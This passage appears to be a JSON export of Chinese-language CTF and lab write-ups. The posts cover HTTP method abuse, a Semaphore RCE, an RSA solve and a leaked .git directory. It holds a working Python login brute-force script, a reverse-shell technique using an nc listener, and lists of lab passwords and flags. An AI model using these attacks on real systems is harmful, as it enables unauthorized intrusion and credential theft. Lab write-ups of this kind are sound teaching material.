done\n    [GET] -> I dont like this method!\n    [POST] -> I dont like this method!\n    [PUT] -> tPlqxSKuT4eP3yr\n    [DELETE] -> I dont like this method!\n    [PATCH] -> I dont like this method!\n    [OPTIONS] -> I dont like this method!\n    ```\n\n3.  \u53d1\u73b0\u4f7f\u7528 `PUT` \u65b9\u6cd5\u65f6\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u4e86\u5bc6\u7801\u3002\n\n4.  \u5207\u6362\u5230 `kira` \u7528\u6237\u3002\n\n    ```bash\n    nina@venus:~$ su kira\n    Password: tPlqxSKuT4eP3yr\n    ```\n\n---\n\n# **Flag  **\n\n```\n22. lucia:         8===5Sr2pqeVTmn8RaaPmTPE===D~~\n23. isabel:        8===Md2CU83GtVfouhm9U0AS===D~~\n24. freya:         8===m1rRSv2pdm3sBGmgidul===D~~\n25. alexa:         8===12ALP3eLlJ1GrTBxwJQM===D~~\n26. ariel:         8===lqTeJ1msxhNjNJCptxmZ===D~~\n27. lola:          8===TMYRw853hx8yKRocFMgM===D~~\n28. celeste:       8===TrdsvMy99slFZtd4Cy4Q===D~~\n29. nina:          8===VwICIymoA1DczWJau1sG===D~~\n30. kira:          8===rJun2WyeuGIvabWQvJko===D~~\n\nHidden Flags:\n- (Mission 23)   8===CISqRtRjnvQbzcRWfCqe===D~~\n- (Mission 29)   8===xKmPDsJSKpHLzkqKXyjx===D~~\n```\n\n# Pass\n\n```\n22: lucia/uvMwFDQrQWPMeGP\n23: isabel/H5ol8Z2mrRsorC0\n24: freya/EEDyYFDwYsmYawj\n25: alexa/mxq9O3MSxxX9Q3S\n26: ariel/33EtHoz9a0w2Yqo\n27: lola/d3LieOzRGX5wud6\n28: celeste/VLSNMTKwSV2o8Tn\n29: nina/ixpeqdWuvC5N9kG\n30: kira/tPlqxSKuT4eP3yr\n```\n\nsentence", "top": 0, "createdAt": 1754441685, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P192": {"htmlDir": "docs/post/nei-bu-_Team.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Team", "postUrl": "post/nei-bu-_Team.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/192", "commentNum": 0, "wordCount": 4713, "description": "![image-20250806132045628](http://7r1UMPHK.github.io/image/20250806132045831.webp)\n\n# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## 1. \u4e3b\u673a\u4e0e\u7aef\u53e3\u53d1\u73b0\n\n\u4f7f\u7528 `arp-scan` \u548c `nmap` \u5728\u672c\u5730\u7f51\u7edc\u8fdb\u884c\u626b\u63cf\uff0c\u53d1\u73b0\u76ee\u6807\u4e3b\u673aIP\u5730\u5740\u4e3a `192.168.205.129`\uff0c\u5e76\u786e\u8ba4\u5176\u5f00\u653e\u4e86 22 (SSH), 80 (HTTP) \u548c 3000 (HTTP) \u7aef\u53e3\u3002\n\n**\u4e3b\u673a\u53d1\u73b0:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.129 08:00:27:43:d1:3f       PCS Systemtechnik GmbH\n...\n```\n\n**\u7aef\u53e3\u626b\u63cf:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.129\n...\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3000/tcp open  ppp\n...\n```\n\n# 2. Web\u670d\u52a1\u4fa6\u5bdf\n\n*   **80\u7aef\u53e3**: \u8fd0\u884c\u4e00\u4e2a\u540d\u4e3a 'Maze Security' \u7684\u9759\u6001\u516c\u53f8\u7f51\u7ad9\u3002\u76ee\u5f55\u626b\u63cf\u53d1\u73b0 `index.php`\uff0c\u4f46\u4e0e\u4e3b\u9875\u5185\u5bb9\u76f8\u540c\uff0c\u672a\u53d1\u73b0\u660e\u663e\u6f0f\u6d1e\u3002\n*   **3000\u7aef\u53e3**: \u8fd0\u884c\u4e00\u4e2aWeb\u5e94\u7528\uff0c\u9875\u9762\u6807\u9898\u4e3a 'Dashboard - Semaphore UI'\u3002\u8fd9\u662f\u4e00\u4e2a\u5173\u952e\u7ebf\u7d22\uff0c\u8868\u660e\u76ee\u6807\u6b63\u5728\u4f7f\u7528 Ansible Semaphore\u3002\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u53d1\u73b0\u4e0e\u5229\u7528**\n\n## 1. \u7248\u672c\u8bc6\u522b\u4e0eCVE\u53d1\u73b0\n\n\u5bf93000\u7aef\u53e3\u7684Web\u5e94\u7528\u8fdb\u884c\u6df1\u5165\u5206\u6790\uff0c\u5728\u5176\u52a0\u8f7d\u7684JavaScript\u6587\u4ef6 `chunk-vendors.54e1419.js` \u4e2d\uff0c\u53d1\u73b0\u4e86\u660e\u786e\u7684\u7248\u672c\u4fe1\u606f\uff1a**Ansible Semaphore v2.7.2**\u3002\n\n\u9488\u5bf9\u8be5\u7279\u5b9a\u7248\u672c\u8fdb\u884c\u6f0f\u6d1e\u641c\u7d22\uff0c\u8fc5\u901f\u5b9a\u4f4d\u5230\u4e00\u4e2a\u5df2\u516c\u5f00\u7684\u4e25\u91cd\u6f0f\u6d1e\uff1a**CVE-2023-39059**\u3002\n\n*   **\u6f0f\u6d1e\u7c7b\u578b**: \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c (RCE)\n*   **\u5f71\u54cd\u7248\u672c**: v2.8.90 \u53ca\u66f4\u65e9\u7248\u672c\n*   **\u653b\u51fb\u5411\u91cf**: \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5411\u4efb\u52a1\u7684 'Extra Variables' (\u989d\u5916\u53d8\u91cf) \u53c2\u6570\u6ce8\u5165\u6076\u610f\u7684 `ansible-playbook` \u8d1f\u8f7d\u6765\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\n*   **\u5229\u7528\u524d\u63d0**: \u9700\u8981\u4e00\u4e2a\u4f4e\u6743\u9650\u7684\u666e\u901a\u7528\u6237\u8d26\u6237\u3002\n\n## 2. \u521d\u59cb\u8bbf\u95ee (\u66b4\u529b\u7834\u89e3)\n\n\u6839\u636e\u6f0f\u6d1e\u4fe1\u606f\uff0c\u9996\u8981\u76ee\u6807\u662f\u83b7\u53d6\u4e00\u4e2a\u6709\u6548\u7684\u7528\u6237\u51ed\u636e\u3002\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684Python\u811a\u672c\uff0c\u7ed3\u5408\u5e38\u89c1\u7528\u6237\u540d\u548c\u5bc6\u7801\u5b57\u5178\uff0c\u5bf9 `/api/auth/login` \u63a5\u53e3\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u653b\u51fb\u3002\n\n```python\nimport requests\nimport threading\nimport queue\nimport sys\n\nt = queue.Queue()\nr = requests.Session()\nh = {\n    'Host': '192.168.205.252:3000',\n    'User-Agent': 'Mozilla/5.0',\n    'Accept': 'application/json, text/plain, */*',\n    'Accept-Encoding': 'gzip, deflate, br',\n    'Content-Type': 'application/json',\n    'Origin': 'http://192.168.205.252:3000',\n    'Connection': 'keep-alive',\n    'Referer': 'http://192.168.205.252:3000/auth/login'\n}\n\nfound = False\nfound_lock = threading.Lock()\n\ndef l(u, p):\n    global found\n    if found:\n        return\n    try:\n        b = f'{{'auth':'{u}','password':'{p}'}}'.encode()\n        x = r.post('http://192.168.205.252:3000/api/auth/login', data=b, headers=h, timeout=5)\n        status = x.status_code\n        if status != 401:\n            with found_lock:\n                if not found:\n                    found = True\n                    print(f'\\n{u}:{p}')\n                    print(f'{u}:{p} | {status} | {len(x.content)}')\n                    # \u505c\u6b62\u6240\u6709\u7ebf\u7a0b\n                    for _ in range(20):\n                        t.put(None)\n        else:\n            print(f'{u}:{p} | 401')\n    except Exception as e:\n        print(f'{u}:{p} | ERR')\n\ndef w():\n    while True:\n        job = t.get()\n        if job is None or found:\n            t.task_done()\n            break\n        l(*job)\n        t.task_done()\n\ndef m():\n    th = []\n    for _ in range(20):\n        x = threading.Thread(target=w)\n        x.start()\n        th.append(x)\n\n    with open('user', 'r') as uf:\n        users = [line.strip() for line in uf if line.strip()]\n    with open('rockyou.txt', 'r', encoding='latin1') as pf:\n        for p in pf:\n            p = p.strip()\n            if not p or found:\n                continue\n            for u in users:\n                if found:\n                    break\n                t.put((u, p))\n            if found:\n                break\n\n    t.join()\n\n    for x in th:\n        x.join()\n\nif __name__ == '__main__':\n    m()\n```\n\n\u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u6210\u529f\u7206\u7834\u51fa\u4e00\u7ec4\u51ed\u636e\uff1a\n\n```\n[+] \u6210\u529f: root:password123\n\u72b6\u6001\u7801: 204, \u54cd\u5e94\u957f\u5ea6: 0\n```\n\n## 3. \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c (RCE)\n\n\u4f7f\u7528 `root:password123` \u51ed\u636e\u6210\u529f\u767b\u5f55\u5230 Ansible Semaphore UI\u3002\n\n### 3.1 \u969c\u788d\u5206\u6790\n\n\u5728UI\u4e2d\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `test` \u7684\u9884\u7f6e\u4efb\u52a1\u3002\u76f4\u63a5\u5c1d\u8bd5\u8fd0\u884c\u8be5\u4efb\u52a1\u5931\u8d25\u3002\u67e5\u770b\u4efb\u52a1\u65e5\u5fd7\u53d1\u73b0\uff0c\u4efb\u52a1\u5728\u6267\u884cPlaybook\u4e4b\u524d\u56e0\u65e0\u6cd5\u514b\u9686Git\u4ed3\u5e93\u800c\u5931\u8d25\uff0c\u9519\u8bef\u4fe1\u606f\u4e3a `Failed updating repository: exit status 128`\u3002\u8fd9\u610f\u5473\u7740\u4ed6\u914d\u7f6e\u7684\u4ed3\u5e93\u6709\u95ee\u9898\u3002\n\n### 3.2 \u7ed5\u8fc7\u969c\u788d\u5e76\u6267\u884cPayload\n\n\u4e3a\u4e86\u4f7f\u4efb\u52a1\u80fd\u591f\u7ee7\u7eed\u6267\u884c\u5230\u89e6\u53d1\u6f0f\u6d1e\u7684\u9636\u6bb5\uff0c\u9700\u8981\u89e3\u51b3Git\u4ed3\u5e93\u514b\u9686\u5931\u8d25\u7684\u95ee\u9898\u3002\u91c7\u53d6\u4ee5\u4e0b\u6b65\u9aa4\uff1a\n\n1. **\u521b\u5efa\u6076\u610f\u4ed3\u5e93**: \u5728GitHub\u4e0a\u521b\u5efa\u4e00\u4e2a\u516c\u5f00\u7684\u4ed3\u5e93\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u540d\u4e3a `test` \u7684\u6587\u4ef6\uff0c\u6587\u4ef6\u5185\u5bb9\u4e3a\u6211\u4eec\u7684\u53cd\u5f39shell\u547d\u4ee4\u3002\n\n   ![image-20250806131556828](http://7r1UMPHK.github.io/image/20250806131557125.webp)\n\n2. **\u914d\u7f6eSemaphore\u4ed3\u5e93**: \u5728Semaphore UI\u7684 **\u4ed3\u5e93 (Repositories)** \u8bbe\u7f6e\u4e2d\uff0c\u7f16\u8f91 `test` \u4ed3\u5e93\uff0c\u5c06\u5176URL\u4fee\u6539\u4e3a\u6211\u4eec\u521b\u5efa\u7684\u6076\u610fGitHub\u4ed3\u5e93\u5730\u5740 (`https://github.com/xxxx/test.git`)\u3002\n\n3. **\u8bbe\u7f6e\u76d1\u542c\u5668**: \u5728\u653b\u51fb\u673a (Kali) \u4e0a\u5f00\u542f `netcat` \u76d1\u542c\uff0c\u51c6\u5907\u63a5\u6536\u53cd\u5f39shell\u3002\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ nc -lvnp 8888\n   ```\n\n4. **\u6267\u884c\u4efb\u52a1**: \u56de\u5230\u4efb\u52a1\u6a21\u677f\u9875\u9762\uff0c\u91cd\u65b0\u8fd0\u884c `test` \u4efb\u52a1\u3002\u8fd9\u6b21\uff0c\u4ed3\u5e93\u514b\u9686\u6210\u529f\uff0c\u4efb\u52a1\u7ee7\u7eed\u6267\u884c\uff0c\u4ece\u800c\u89e6\u53d1\u4e86\u6211\u4eec\u9884\u8bbe\u5728 `test` \u6587\u4ef6\u4e2d\u7684\u53cd\u5f39shell\u547d\u4ee4\u3002\n\n\u6210\u529f\u5728\u672c\u5730 `netcat` \u76d1\u542c\u5668\u4e0a\u63a5\u6536\u5230\u6765\u81ea\u76ee\u6807\u670d\u52a1\u5668\u7684 `root` \u6743\u9650\u53cd\u5f39shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.129] 53826\nbash: cannot set terminal process group (348): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@Team:~/repository_1_template_1# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n# **\u4e09\u3001\u593a\u53d6\u65d7\u5e1c**\n\n\u83b7\u53d6 `root` shell\u540e\uff0c\u76f4\u63a5\u8bfb\u53d6\u7528\u6237\u548c\u6839\u76ee\u5f55\u4e0b\u7684\u65d7\u5e1c\u6587\u4ef6\u3002\n\n```bash\nroot@Team:~/repository_1_template_1# cat /root/root.txt /home/ll104567/user.txt\nflag{root-cf768ad5a2fbffcf22d79bdb3feac305}\nflag{user-f1d1d471045542b64f3fff665b42035a}\n```sentence", "top": 0, "createdAt": 1754482801, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P193": {"htmlDir": "docs/post/Challenge 090.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 090", "postUrl": "post/Challenge%20090.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/193", "commentNum": 0, "wordCount": 3584, "description": "![image-20250806202931588](http://7r1UMPHK.github.io/image/20250806202940843.webp)\n\n# \u9898\u76ee\u56de\u987e\n\n\u8be5\u9898\u76ee\u63d0\u4f9b\u4e86\u4e00\u7ec4 RSA \u52a0\u5bc6\u7684\u53c2\u6570\uff0c\u5305\u62ec\u516c\u94a5\u6307\u6570 `e`\u3001\u4e24\u4e2a\u5927\u7d20\u6570 `p` \u548c `q`\uff0c\u4ee5\u53ca\u5bc6\u6587 `c`\u3002\u8981\u6c42\u6211\u4eec\u89e3\u5bc6\u51fa\u539f\u59cb\u660e\u6587 `m`\u3002\n\n# **\u5df2\u77e5\u53c2\u6570**\n\n* **\u516c\u94a5\u6307\u6570 (e):**\n\n  ```\n  e = 15\n  ```\n\n* **\u7d20\u6570 (p):**\n\n  ```\n  p = 5787222305777209512262474249244794237065756326718637677563926399912102998238238932691915883680852764360339657453541520126740501334731391462921270092825561\n  ```\n\n* **\u7d20\u6570 (q):**\n\n  ```\n  q = 10111241397646344099231145262379017618139453896281400953386716762942327959742747939245765751686811392320346902374279922240577945339761221088737443752162629\n  ```\n\n* **\u5bc6\u6587 (c):**\n\n  ```\n  c = 32966311998568049751620491316882873597067466204334745472749990770205777075918461832930873069801888997659326011373601710520150688126730186357963781365253139365104376745890253761612763280897233928482429448491903090758335034298212464171556884740072764043302348824188102589373055730702026853687688157030795220298\n  ```\n\n\u501f\u52a9\u4e86\u7fa4\u53cb\u7684\u795e\u529b\n\n![image-20250806222111843](http://7r1UMPHK.github.io/image/20250806222112003.webp)\n\n```\nimport gmpy2\nimport libnum\n\ne= 15\np=5787222305777209512262474249244794237065756326718637677563926399912102998238238932691915883680852764360339657453541520126740501334731391462921270092825561 \nq=10111241397646344099231145262379017618139453896281400953386716762942327959742747939245765751686811392320346902374279922240577945339761221088737443752162629\nc=32966311998568049751620491316882873597067466204334745472749990770205777075918461832930873069801888997659326011373601710520150688126730186357963781365253139365104376745890253761612763280897233928482429448491903090758335034298212464171556884740072764043302348824188102589373055730702026853687688157030795220298\nn=p*q\n\ngcd_q = gmpy2.gcd(e, q - 1)  # 1\nd = gmpy2.invert(e, q - 1)\nm = pow(c, d, q)\nprint(libnum.n2s(int(m)))\n```\n\n# \u89e3\u9898\u601d\u8def\n\n## 1. \u53d1\u73b0\u95ee\u9898\n\n\u6807\u51c6\u7684 RSA \u89e3\u5bc6\u6d41\u7a0b\u9700\u8981\u8ba1\u7b97\u79c1\u94a5 `d`\uff0c\u5176\u4e2d `d` \u662f `e` \u6a21 `\u03c6(n)` \u7684\u4e58\u6cd5\u9006\u5143\uff0c\u5373 `d = e\u207b\u00b9 mod \u03c6(n)`\uff0c\u800c `\u03c6(n) = (p-1)(q-1)`\u3002\u8ba1\u7b97\u8be5\u9006\u5143\u7684\u524d\u63d0\u662f `e` \u548c `\u03c6(n)` \u5fc5\u987b\u4e92\u7d20\uff0c\u5373 `gcd(e, \u03c6(n)) = 1`\u3002\n\n\u6211\u4eec\u6765\u68c0\u67e5\u8fd9\u4e2a\u6761\u4ef6\uff1a\n\n*   `e = 15 = 3 * 5`\n*   `p - 1` \u7684\u672b\u5c3e\u662f `0`\uff0c\u56e0\u6b64 `p-1` \u662f `5` \u7684\u500d\u6570\u3002\n*   \u8fd9\u610f\u5473\u7740 `\u03c6(n) = (p-1)(q-1)` \u4e5f\u662f `5` \u7684\u500d\u6570\u3002\n*   \u6240\u4ee5 `gcd(e, \u03c6(n))` \u81f3\u5c11\u4e3a `5`\uff0c\u4e0d\u7b49\u4e8e `1`\u3002\n\n**\u7ed3\u8bba\uff1a** \u65e0\u6cd5\u901a\u8fc7\u6807\u51c6\u65b9\u5f0f\u8ba1\u7b97\u79c1\u94a5 `d` \u6765\u76f4\u63a5\u5bf9\u6a21 `n` \u89e3\u5bc6\u3002\n\n## 2. \u67f3\u6697\u82b1\u660e\n\n\u867d\u7136 `e` \u548c `\u03c6(n)` \u4e0d\u4e92\u7d20\uff0c\u4f46\u89e3\u5bc6\u4ecd\u6709\u53ef\u80fd\u3002\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u7684\u601d\u60f3\uff0c\u5206\u522b\u5728\u6a21 `p` \u548c\u6a21 `q` \u7684\u610f\u4e49\u4e0b\u8fdb\u884c\u89e3\u5bc6\u3002\u8fd9\u9700\u8981 `e` \u4e0e `p-1` \u6216 `q-1` \u4e92\u7d20\u3002\n\n\u6211\u4eec\u6765\u68c0\u67e5 `e` \u4e0e `p-1` \u548c `q-1` \u7684\u6700\u5927\u516c\u7ea6\u6570\uff1a\n\n*   `gcd(e, p - 1)`: \u56e0\u4e3a `p-1` \u662f `5` \u7684\u500d\u6570\uff0c\u6240\u4ee5 `gcd(15, p - 1) = 5`\u3002\u6211\u4eec\u65e0\u6cd5\u5728\u6a21 `p` \u7684\u610f\u4e49\u4e0b\u76f4\u63a5\u6c42\u9006\u3002\n*   `gcd(e, q - 1)`: \u7ecf\u8fc7\u8ba1\u7b97\uff0c`gcd(15, q - 1) = 1`\u3002\n\n**\u7ed3\u8bba\uff1a** \u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97 `e` \u5728\u6a21 `q-1` \u4e0b\u7684\u9006\u5143\uff0c\u4ece\u800c\u5728\u6a21 `q` \u7684\u610f\u4e49\u4e0b\u6062\u590d\u660e\u6587\u3002\n\n## 3. \u89e3\u5bc6\u539f\u7406\n\n\u65e2\u7136 `gcd(e, q - 1) = 1`\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u51fa `d_q` \u6ee1\u8db3\uff1a\n`d_q \u2261 e\u207b\u00b9 (mod q - 1)`\n\n\u6839\u636e RSA \u7684\u52a0\u5bc6\u8fc7\u7a0b\uff0c\u6211\u4eec\u6709\uff1a\n`c \u2261 m^e (mod n)`\n\n\u8fd9\u4e5f\u610f\u5473\u7740\uff1a\n`c \u2261 m^e (mod q)`\n\n\u4e24\u8fb9\u540c\u65f6\u53d6 `d_q` \u6b21\u65b9\uff1a\n`c^d_q \u2261 (m^e)^d_q \u2261 m^(e*d_q) (mod q)`\n\n\u7531\u4e8e `e*d_q \u2261 1 (mod q - 1)`\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u5199\u6210 `e*d_q = k*(q-1) + 1` \u7684\u5f62\u5f0f\uff08\u5176\u4e2d k \u662f\u67d0\u4e2a\u6574\u6570\uff09\u3002\u4ee3\u5165\u4e0a\u5f0f\uff1a\n`c^d_q \u2261 m^(k*(q-1) + 1) \u2261 m * (m^(q-1))^k (mod q)`\n\n\u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c`m^(q-1) \u2261 1 (mod q)`\u3002\u56e0\u6b64\uff1a\n`c^d_q \u2261 m * 1^k \u2261 m (mod q)`\n\n\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u5f97\u5230\u4e86 `m' = m mod q`\u3002\u5728 CTF \u7ade\u8d5b\u4e2d\uff0c\u5982\u679c\u660e\u6587\u672c\u8eab\u4e0d\u662f\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u6570\u5b57\uff08\u5373 `m < q`\uff09\uff0c\u90a3\u4e48\u6211\u4eec\u8ba1\u7b97\u51fa\u7684 `m'` \u5c31\u7b49\u4e8e\u539f\u59cb\u660e\u6587 `m`\u3002\n\n# \u5c0f\u6280\u5de7\u603b\u7ed3\n\n| \u6761\u4ef6                | \u80fd\u5426\u89e3\u5bc6 | \u89e3\u5bc6\u65b9\u5f0f                                |\n| :------------------ | :------- | :-------------------------------------- |\n| `gcd(e, \u03c6(n)) == 1` | \u2705        | \u6807\u51c6 RSA \u89e3\u5bc6\uff0c`d = inverse(e, \u03c6(n))`   |\n| `gcd(e, p\u22121) == 1`  | \u2705        | \u53ef\u5728 `mod p` \u610f\u4e49\u4e0b\u89e3\u5bc6\uff0c\u5f97\u5230 `m mod p` |\n| `gcd(e, q\u22121) == 1`  | \u2705        | \u53ef\u5728 `mod q` \u610f\u4e49\u4e0b\u89e3\u5bc6\uff0c\u5f97\u5230 `m mod q` |\n| `gcd(e, p\u22121) > 1`   | \u274c        | \u65e0\u6cd5\u76f4\u63a5\u6c42 `e` \u6a21 `p-1` \u7684\u9006\u5143          |\n| `gcd(e, q\u22121) > 1`   | \u274c        | \u65e0\u6cd5\u76f4\u63a5\u6c42 `e` \u6a21 `q-1` \u7684\u9006\u5143          |\n\n# \u6700\u7ec8\u7ed3\u679c\n\n\u8fd0\u884c\u4e0a\u8ff0\u4ee3\u7801\u540e\uff0c\u6211\u4eec\u6210\u529f\u5f97\u5230\u660e\u6587\uff1a\n\n```\nnext_time_make_sure_to_choose_the_appropriate_e_788403071518\n```sentence", "top": 0, "createdAt": 1754490614, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P194": {"htmlDir": "docs/post/nei-bu-_Xuanji.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Xuanji", "postUrl": "post/nei-bu-_Xuanji.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/194", "commentNum": 0, "wordCount": 3867, "description": "![image-20250807122524603](http://7r1UMPHK.github.io/image/20250807122557994.webp)\n\n# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## 1. \u4e3b\u673a\u53d1\u73b0\u4e0e\u7aef\u53e3\u626b\u63cf\n\n\u9996\u5148\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f7f\u7528 `arp-scan` \u786e\u5b9a\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\uff0c\u968f\u540e\u5229\u7528 `nmap` \u5bf9\u5176\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n**\u4e3b\u673a\u53d1\u73b0:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.135 08:00:27:03:7d:ae       PCS Systemtechnik GmbH\n...\n```\n\n**\u7aef\u53e3\u626b\u63cf:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p- 192.168.205.135\n...\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u8868\u660e\uff0c\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.135`\uff0c\u5f00\u653e\u4e86 **22 (SSH)** \u548c **80 (HTTP)** \u7aef\u53e3\u3002\n\n## 2. Web\u670d\u52a1\u4fa6\u5bdf\n\n\u8bbf\u95ee80\u7aef\u53e3\u7684Web\u670d\u52a1\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u8981\u6c42\u8f93\u5165Google OTP\uff08\u52a8\u6001\u53e3\u4ee4\uff09\u7684\u767b\u5f55\u9875\u9762\u3002\u8fd9\u8868\u660e\u8eab\u4efd\u9a8c\u8bc1\u662f\u8fdb\u5165\u7cfb\u7edf\u7684\u9996\u8981\u969c\u788d\u3002\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u53d1\u73b0\u4e0e\u5229\u7528**\n\n## 1. \u53d1\u73b0`.git`\u6e90\u7801\u6cc4\u9732\n\n\u9488\u5bf9Web\u76ee\u5f55\u8fdb\u884c\u6df1\u5ea6\u626b\u63cf\uff0c\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a\u516c\u5f00\u7684 `.git` \u76ee\u5f55\u3002\u8fd9\u662f\u4e00\u4e2a\u4e25\u91cd\u7684\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\uff0c\u610f\u5473\u7740\u6574\u4e2aWeb\u5e94\u7528\u7684\u6e90\u4ee3\u7801\u548c\u7248\u672c\u63a7\u5236\u5386\u53f2\u90fd\u53ef\u80fd\u88ab\u83b7\u53d6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ dirsearch -u http://192.168.205.135 \n...\n[00:31:43] 301 -  317B  - /.git  ->  http://192.168.205.135/.git/\n...\n```\n\n## 2. \u8fd8\u539fGit\u4ed3\u5e93\u5e76\u5ba1\u8ba1\u5386\u53f2\u8bb0\u5f55\n\n\u4f7f\u7528 `git-dumper` \u5de5\u5177\u5c06\u6cc4\u9732\u7684 `.git` \u4ed3\u5e93\u5b8c\u6574\u5730\u4e0b\u8f7d\u5230\u672c\u5730\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ git-dumper http://192.168.205.135 .\n...\n[-] Running git checkout .\n\u4ece\u7d22\u5f15\u533a\u66f4\u65b0\u4e86 1 \u4e2a\u8def\u5f84\n```\n\n\u8fdb\u5165\u8fd8\u539f\u540e\u7684\u4ed3\u5e93\u76ee\u5f55\uff0c\u4f7f\u7528 `git log -p` \u547d\u4ee4\u5ba1\u67e5\u63d0\u4ea4\u5386\u53f2\u3002\u5728\u5386\u53f2\u8bb0\u5f55\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a\u5173\u952e\u7ebf\u7d22\uff1a\u5f00\u53d1\u4eba\u5458\u66fe\u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u6ce8\u91ca\u6dfb\u52a0\u5230\u4e86 `index.php` \u6587\u4ef6\u4e2d\uff0c\u968f\u540e\u53c8\u5728\u4e0b\u4e00\u6b21\u63d0\u4ea4\u4e2d\u5c06\u5176\u5220\u9664\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ git log -p\n...\ncommit 189e0034eedd9d026e9d691c9782c72ee51940a1\nAuthor: Your Name <you@example.com>\n...\n-<!-- 3XKWRL4MDQ5YYPZSYBPDGFLHFA  -->\n\ncommit 3dc42d3b5f90552544550d2e09b661fcb114bfe4\nAuthor: Your Name <you@example.com>\n...\n+<!-- 3XKWRL4MDQ5YYPZSYBPDGFLHFA  -->\n...\n```\n\n\u8fd9\u4e2a\u88ab\u6dfb\u52a0\u540e\u53c8\u5220\u9664\u7684\u5b57\u7b26\u4e32 `3XKWRL4MDQ5YYPZSYBPDGFLHFA` \u7b26\u5408Base32\u7f16\u7801\u683c\u5f0f\uff0c\u6781\u6709\u53ef\u80fd\u662f\u7528\u4e8e\u751f\u6210Google Authenticator\u52a8\u6001\u53e3\u4ee4\u7684**\u5171\u4eab\u5bc6\u94a5 (TOTP Secret Key)**\u3002\n\n### 3. 